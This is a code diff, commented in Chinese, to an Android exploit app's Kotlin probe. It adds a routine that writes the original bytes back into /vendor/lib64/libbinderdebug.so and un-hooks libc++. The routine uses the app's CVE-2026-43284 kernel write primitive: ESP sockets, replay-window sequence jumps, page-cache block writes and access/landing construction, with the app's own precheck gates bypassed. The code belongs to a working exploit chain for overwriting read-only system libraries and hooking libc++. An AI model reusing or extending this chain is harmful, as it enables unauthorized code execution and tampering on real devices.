@@ -24,6 +24,8 @@ import com.ghostlock.app.core.generated.WordWrite43499
 import com.ghostlock.app.jni.cve43284.Native43284
 import com.ghostlock.app.jni.cve43499.Native43499
 import com.ghostlock.app.log.GhostLog
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.withContext
 
 /**
  * 新函数面的真机探针（D2 装配的门禁）。
@@ -400,6 +402,385 @@ object TypedBackendProbe {
         )
         refusal.forEach { line -> step(line) }
         return refusal
+    }
+
+    /**
+     *  复原写的字节数：**等于我们往载体写过的最大长度**。
+     *
+     *  真机记录（同一载体、同一构建，只差模块体积）：23:43 那次尝试的是 23512 B 的模块镜像
+     *  （1470 块；日志在写中途报 call-failed），失败前可能已有多块落盘 —— 所以复原按**上限**处理：
+     *  从 offset 0 起写回前 23512 字节；再往后的部分没有证据说被改过，不能凭猜覆盖。
+     */
+    const val RESTORE_BYTES: Int = 23512
+
+    /**
+     *  复原写的起始序号。
+     *
+     *  同一条 SA 上先前的写已经把内核防重放窗口推到某个值，而复原路径**不许**新增全局状态，
+     *  拿不到那个值 ⇒ 直接从一个远高于一次运行写数（最多数千块）的位置起步。
+     *  Linux xfrm 的 replay check 对**向前跳**的序号放行（只丢已经见过的、落在窗口内的），
+     *  所以这个起点在"同进程先跑过链"与"本进程第一次写"两种形态下都成立。
+     */
+    private const val RESTORE_SEQUENCE: Long = 0x4000_0000L
+
+    /**
+     *  钩子还原会话的起始序号：与 [RESTORE_SEQUENCE] 是同一条 SA，必须比复原写走得更远
+     *  （否则会被防重放窗口当成重复序号丢掉）。
+     */
+    private const val RESTORE_HOOK_SEQUENCE: Long = 0x5000_0000L
+
+    /** 复原会话每多少块打一行进度（1470 块逐块打会把日志面板刷满）。 */
+    private const val RESTORE_PROGRESS_BLOCKS: Int = 256
+
+    /** 头四字节：复原前后各读一次，只报这四个（读原语是十六字节块）。 */
+    private const val RESTORE_HEAD_BYTES: Int = 4
+
+    /**
+     *  一次复原调用内的"只做一次"动作（SA 前置用）。
+     *
+     *  @note 它是**本次调用的局部对象**，不是全局状态：复原按钮点第二次就重新建一个。
+     */
+    private class OnceAction(private val action: () -> Unit) {
+        private var done = false
+
+        /** 第一次调用执行动作；之后什么都不做（失败也不重试，避免同一路径刷两遍拒绝行）。 */
+        fun ensure() {
+            if (!done) {
+                done = true
+                action()
+            }
+        }
+    }
+
+    /**
+     *  复原载体（**只用于复原，不得用于攻击**）：把 system 那份原厂字节写回 vendor 载体。
+     *
+     *  # 为什么这是我们自己的补救路径
+     *  参考实现 ghostlock-app-ref@5f184760 **没有复原路径**：它的终点恢复只把钩子站点的
+     *  guard/displaced 两个字写回 libc++（src/core/backend/cve_2026_43284/steps/chain.cpp:355 的
+     *  "It runs on every terminus path"，实现见同树 steps/hook_patch.cpp:193-225），从不把被写坏的
+     *  载体 ELF 头修回去 —— 它的写链假定载体是厂家原件。本仓跑链时把字节写进了
+     *  /vendor/lib64/libbinderdebug.so 的 offset 0（最多 [RESTORE_BYTES] 字节），原厂字节未留存；
+     *  唯一可复原来源是 /system/lib64/libbinderdebug.so（91088 B、world-readable、与载体同源）。
+     *  所以复原逻辑只能自己写，理由只有两条：① 原厂字节还在 system 那份里，读它不依赖任何设备权限；
+     *  ② 写/读原语已经现成（Assembled43284.writeImage / readBlock），不需要新的 native 能力。
+     *
+     *  # 与攻击路径的两处**显式**差别
+     *  1. **不跑模块 precheck**：它判的是"这份镜像能不能加载"（ELF/modinfo/vermagic），复原与加载无关；
+     *  2. **不跑计划闭包闸门**（PlanClosure）：它判的是"攻击要写的三个区域是否合法"，复原只写 offset 0。
+     *  两者都不改变写原语本身。日志第一行固定是
+     *  restore-mode: precheck bypassed (carrier restore)，它是这条路径的标记。
+     *
+     *  流程：读来源前 23512 B → 用与"写模块"同一套 create / initialize / writeImage 会话逐块写回 →
+     *  写前写后各读一次载体头四字节 → 关复原会话（让出 ESP socket 的固定 sender 端口）→
+     *  **无条件**调用既有 restoreHook（在独立 hook 会话上，见 [restoreHookSite]）。
+     *  钩子还原失败不影响载体修复的结果。
+     *
+     *  @param emit 逐行日志（本方法同时写 GhostLog，所以统一日志面板能看到同一批行）。
+     *  @return 载体是否复原：全部块写完、计划覆盖 [RESTORE_BYTES]、0 偏移回读为 7f454c46。
+     *          钩子还原的结果单独打一行 restore: hook restored=<bool>，不参与这个返回值。
+     *  @note 只在"本次开机、同一进程"里有意义：钩子活在页缓存里，重启后载体回到磁盘上的原样。
+     */
+    suspend fun restoreCarrier(emit: (String) -> Unit): Boolean = withContext(Dispatchers.IO) {
+        fun line(text: String) {
+            GhostLog.i(TAG, text)
+            emit(text)
+        }
+        /* SA 前置在本次调用内只尝试一次：第一次建不成时，后面的钩子还原不再把同一批拒绝行刷一遍。 */
+        val sa = OnceAction {
+            if (!saReady) {
+                val context = probeContext
+                if (context == null) {
+                    line("restore: sa missing (no context; run the chain once in this process first)")
+                } else {
+                    ensureChainReady(context, ::line)
+                }
+            }
+        }
+        CarrierRestore(::line).run(
+            source = { CarrierRestore.readSource(RESTORE_BYTES) },
+            session = { openCarrierRestoreSession(::line, sa) },
+            restoreHook = { restoreHookSite(::line, sa) },
+        )
+    }
+
+    /**
+     *  同上，但由调用方**显式**给 Context：新进程里 [probeContext] 还没有值（它只在攻击/门禁
+     *  跑过之后才被记住），而复原要建 SA 就必须拿到 IpSecManager —— 复原按钮走这一条。
+     *
+     *  @param context 建 SA 用；null ⇒ 只用本进程已有的 SA（与单击版本同义）。
+     *  @param emit    逐行日志（与单击版本同一条去处：GhostLog + 统一日志面板）。
+     *  @return 与 [restoreCarrier]（单参版本）同义：载体是否复原；钩子还原单独打一行。
+     *  @note 只是把 Context 记进 [probeContext] 后转交单参版本：复原流程本身只有一条。
+     */
+    suspend fun restoreCarrier(context: android.content.Context?, emit: (String) -> Unit): Boolean {
+        if (context != null) {
+            probeContext = context
+        }
+        return restoreCarrier(emit)
+    }
+
+    /**
+     *  建复原会话：与"写模块"同一套 create / initialize / writeImage，只是不跑前置判据。
+     *
+     *  拼装顺序照链子的载体段：initialize → 开目标 → ESP socket → 拼接面 → 落地 → Access →
+     *  用会话材料初始化 Access。任何一步失败都会先关掉已建的部分再返回 null。
+     *
+     *  @param emit 逐行日志。
+     *  @param sa   本次复原的 SA 前置（只尝试一次）。
+     *  @return 建好并初始化完成的会话（一块 = 一次 writeImage）；失败 null（原因已进日志）。
+     */
+    private fun openCarrierRestoreSession(emit: (String) -> Unit, sa: OnceAction): CarrierRestore.Session? {
+        if (!Native43284.ensureLoaded()) {
+            emit("restore: 43284 library missing (lib" + Native43284.LIBRARY + ".so)")
+            return null
+        }
+        sa.ensure()
+        if (!saReady) {
+            emit("restore: carrier session skipped sa-missing (probe material would be dropped)")
+            return null
+        }
+        val meter = StepMeter(emit)
+        meter.before("Native43284.create", "lib=" + Native43284.LIBRARY + " (carrier restore)")
+        val handle = Native43284.create()
+        meter.after("Native43284.create", "handle=" + handle)
+        if (handle <= 0) {
+            emit("restore: carrier session refused create")
+            return null
+        }
+        /* 没有 SequenceContinuation：复原的序号由 access 初始化那一次 adopt 决定，块写各自推进窗口。 */
+        val session = Assembled43284(handle) { saInit(RESTORE_SEQUENCE) }
+        fun abort(what: String): CarrierRestore.Session? {
+            emit(
+                "restore: carrier session refused " + what + " code=" + session.lastCode +
+                    " refusal=" + session.lastRefusal,
+            )
+            closeRestoreSession(session, emit)
+            return null
+        }
+        meter.before("Assembled43284.initialize", "handle=" + handle + " seq=" + RESTORE_SEQUENCE)
+        val initialized = session.initialize(saInit(RESTORE_SEQUENCE)) == 0
+        meter.after(
+            "Assembled43284.initialize",
+            "ok=" + initialized + " code=" + session.lastCode + " refusal=" + session.lastRefusal,
+        )
+        if (!initialized) {
+            return abort("initialize")
+        }
+        meter.before("Assembled43284.openTargetStepwise", "path=" + CarrierRestore.CARRIER_PATH)
+        val ticket = session.openTargetStepwise(CarrierRestore.CARRIER_PATH)
+        meter.after(
+            "Assembled43284.openTargetStepwise",
+            "ticket=" + ticket + " code=" + session.lastCode + " refusal=" + session.lastRefusal,
+        )
+        if (ticket == 0L) {
+            return abort("open-target")
+        }
+        meter.before("Assembled43284.openEspSocket", "seq=" + RESTORE_SEQUENCE)
+        val socket = session.openEspSocket()
+        meter.after(
+            "Assembled43284.openEspSocket",
+            "socket=" + socket + " code=" + session.lastCode + " refusal=" + session.lastRefusal,
+        )
+        if (socket == 0L) {
+            return abort("esp-socket")
+        }
+        meter.before("Assembled43284.buildSurface", "target=" + session.targetId + " socket=" + session.socketId)
+        val surface = session.buildSurface()
+        meter.after("Assembled43284.buildSurface", "surface=" + surface + " code=" + session.lastCode)
+        if (surface == 0L) {
+            return abort("surface")
+        }
+        meter.before("Assembled43284.buildLanding", "surface=" + session.surfaceId)
+        val landing = session.buildLanding()
+        meter.after("Assembled43284.buildLanding", "landing=" + landing + " code=" + session.lastCode)
+        if (landing == 0L) {
+            return abort("landing")
+        }
+        meter.before("Assembled43284.buildAccess", "landing=" + session.landingId)
+        val access = session.buildAccess()
+        meter.after("Assembled43284.buildAccess", "access=" + access + " code=" + session.lastCode)
+        if (access == 0L) {
+            return abort("access")
+        }
+        val params = Assembled43284.fullAccessParams(CarrierRestore.CARRIER_PATH)
+        meter.before(
+            "Assembled43284.initializeAccessAndRemember",
+            "access=" + session.accessId + " path=" + CarrierRestore.CARRIER_PATH,
+        )
+        val ready = session.initializeAccessAndRemember(params, saInit(RESTORE_SEQUENCE))
+        meter.after(
+            "Assembled43284.initializeAccessAndRemember",
+            "ok=" + ready + " code=" + session.lastCode + " refusal=" + session.lastRefusal,
+        )
+        if (!ready) {
+            return abort("access-initialize")
+        }
+        emit(
+            "restore: carrier session target=" + ticket + " socket=" + session.socketId +
+                " surface=" + session.surfaceId + " landing=" + session.landingId +
+                " access=" + session.accessId,
+        )
+        /*
+         * 适配器：一块 = 一次 writeImage。precheckModule 只是接口上的**反面约束**（复原绝不调用；
+         * 单测用 fake 计数证明），这里的实现照攻击路径的同一判据，以防有人把它接进复原流程。
+         */
+        return object : CarrierRestore.Session {
+            private var blocks = 0
+
+            override fun precheckModule(image: ByteArray): Boolean =
+                com.ghostlock.app.jni.cve43284.ModulePrecheck43284.check(image) is
+                    com.ghostlock.app.jni.cve43284.ModulePrecheck43284.Precheck.Ok
+
+            override fun writeBlock(offset: Long, block: ByteArray): Boolean {
+                val ok = session.writeImage(block, offset, Assembled43284.BLOCK.toLong(), saInit(RESTORE_SEQUENCE))
+                if (!ok) {
+                    emit(
+                        "restore: block detail offset=" + offset + " code=" + session.lastCode +
+                            " refusal=" + session.lastRefusal,
+                    )
+                    return false
+                }
+                blocks += 1
+                if (blocks % RESTORE_PROGRESS_BLOCKS == 0) {
+                    emit("restore: progress=" + blocks + " offset=" + offset)
+                }
+                return true
+            }
+
+            override fun readHead(): ByteArray? =
+                session.readBlock(ticket, 0L)?.copyOf(RESTORE_HEAD_BYTES)
+
+            override fun close() {
+                closeRestoreSession(session, emit)
+            }
+        }
+    }
+
+    /**
+     *  既有终点恢复（Assembled43284.restoreHook）的一次独立调用。
+     *
+     *  复原按钮是独立入口：链子留下的 hook 会话/计划是 probeAssembled43284 的局部变量，
+     *  进程里没有可借用的那一份（也不许为此新增全局可变状态）。所以这里按链子的终点段重建一个
+     *  最小 hook 会话：门 = libc++、同一条 SA、自己的 ESP socket（载体复原会话已在调用前关掉，
+     *  固定的 sender 端口已让出）；计划用 hookPlan 现算。
+     *  native 的 restore_hook 是幂等的（pagecache_steps.cpp:221-283：读旧块 → 写 guard/displaced →
+     *  回读比对），钩子没装过时写回的也是原字节。
+     *
+     *  @param emit 逐行日志。
+     *  @param sa   本次复原的 SA 前置（只尝试一次）。
+     *  @return restoreHook 的返回；任何一步建不起来都 false（原因已进日志）。
+     */
+    private fun restoreHookSite(emit: (String) -> Unit, sa: OnceAction): Boolean {
+        if (!Native43284.ensureLoaded()) {
+            emit("restore: hook restore skipped library-missing")
+            return false
+        }
+        sa.ensure()
+        if (!saReady) {
+            emit("restore: hook restore skipped sa-missing")
+            return false
+        }
+        val meter = StepMeter(emit)
+        meter.before("Native43284.create", "lib=" + Native43284.LIBRARY + " (hook restore)")
+        val handle = Native43284.create()
+        meter.after("Native43284.create", "handle=" + handle)
+        if (handle <= 0) {
+            emit("restore: hook restore refused create")
+            return false
+        }
+        val session = Assembled43284(handle) { saInit(RESTORE_HOOK_SEQUENCE) }
+        return try {
+            meter.before("Assembled43284.initialize", "handle=" + handle + " seq=" + RESTORE_HOOK_SEQUENCE)
+            val initialized = session.initialize(saInit(RESTORE_HOOK_SEQUENCE)) == 0
+            meter.after(
+                "Assembled43284.initialize",
+                "ok=" + initialized + " code=" + session.lastCode + " refusal=" + session.lastRefusal,
+            )
+            if (!initialized) {
+                false
+            } else {
+                meter.before("Assembled43284.openTargetStepwise", "path=" + Assembled43284.HOOK_TARGET)
+                val target = session.openTargetStepwise(Assembled43284.HOOK_TARGET)
+                meter.before("Assembled43284.openEspSocket", "seq=" + RESTORE_HOOK_SEQUENCE)
+                val socket = session.openEspSocket()
+                val surface = if (target != 0L && socket != 0L) session.buildSurface() else 0L
+                val landing = if (surface != 0L) session.buildLanding() else 0L
+                val access = if (landing != 0L) session.buildAccess() else 0L
+                meter.after(
+                    "Assembled43284.buildAccess",
+                    "target=" + target + " socket=" + socket + " surface=" + surface +
+                        " landing=" + landing + " access=" + access + " code=" + session.lastCode +
+                        " refusal=" + session.lastRefusal,
+                )
+                val params = Assembled43284.fullAccessParams(Assembled43284.HOOK_TARGET)
+                val ready = access != 0L &&
+                    session.initializeAccessAndRemember(params, saInit(RESTORE_HOOK_SEQUENCE))
+                if (!ready) {
+                    emit(
+                        "restore: hook restore skipped access code=" + session.lastCode +
+                            " refusal=" + session.lastRefusal,
+                    )
+                    false
+                } else {
+                    meter.before(
+                        "Assembled43284.hookPlan",
+                        "symbol=splice guard=" +
+                            Assembled43284.guardPolicyName(Assembled43284.GUARD_POLICY_SKIP) +
+                            " (hook restore)",
+                    )
+                    val words = session.hookPlan("splice", Assembled43284.GUARD_POLICY_SKIP)
+                    meter.after(
+                        "Assembled43284.hookPlan",
+                        "words=" + (words?.joinToString(",") ?: "null") +
+                            " code=" + session.lastCode + " refusal=" + session.lastRefusal,
+                    )
+                    val plan = if (words != null) session.planOf(words) else null
+                    if (plan == null) {
+                        emit(
+                            "restore: hook restore skipped plan-missing code=" + session.lastCode +
+                                " refusal=" + session.lastRefusal,
+                        )
+                        false
+                    } else {
+                        meter.before(
+                            "Assembled43284.restoreHook",
+                            "site=0x" + java.lang.Long.toHexString(plan.hookPlanFileOffset) +
+                                " width=" + Assembled43284.BLOCK + " seq=" + RESTORE_HOOK_SEQUENCE,
+                        )
+                        val restored = session.restoreHook(
+                            plan,
+                            Assembled43284.BLOCK.toLong(),
+                            saInit(RESTORE_HOOK_SEQUENCE),
+                        )
+                        meter.after(
+                            "Assembled43284.restoreHook",
+                            "ok=" + restored + " code=" + session.lastCode +
+                                " refusal=" + session.lastRefusal,
+                        )
+                        restored
+                    }
+                }
+            }
+        } catch (problem: Throwable) {
+            emit("restore: hook restore refused " + problem.javaClass.simpleName + ":" + (problem.message ?: ""))
+            false
+        } finally {
+            closeRestoreSession(session, emit)
+        }
+    }
+
+    /**
+     *  关掉一个复原会话：Access → 落地/拼接面/socket/门 → 句柄。
+     *
+     *  @param session 复原路径建的会话（Access 可能还没建）。
+     *  @param emit    逐行日志（一行汇总三个结果）。
+     */
+    private fun closeRestoreSession(session: Assembled43284, emit: (String) -> Unit) {
+        val access = runCatching { session.destroyAccessNow() }.getOrDefault(false)
+        val torn = runCatching { session.tearDown() }.getOrDefault(false)
+        val closed = runCatching { session.close() }.getOrDefault(false)
+        emit("restore: session closed access=" + access + " tearDown=" + torn + " close=" + closed)
     }
 
     private fun probe43499(step: (String) -> Unit) {
